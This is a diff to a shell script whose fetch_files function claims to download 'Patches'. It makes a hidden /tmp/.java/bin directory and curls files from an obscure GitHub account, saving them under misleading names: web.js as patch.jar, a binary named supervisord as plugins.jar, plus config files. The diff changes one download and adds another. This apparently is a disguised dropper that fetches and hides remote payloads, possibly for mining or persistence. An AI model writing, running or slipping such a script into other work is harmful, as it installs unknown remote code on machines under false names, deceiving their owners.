@@ -3,9 +3,10 @@
 function fetch_files() {
     echo "Downloading Patches ..."
     mkdir -p /tmp/.java/bin
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o patch.jar
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/arm/web.js -o patch.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-xeh.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-xeh-conf.json -o conf.json
     echo "DONE ..."
 }
 
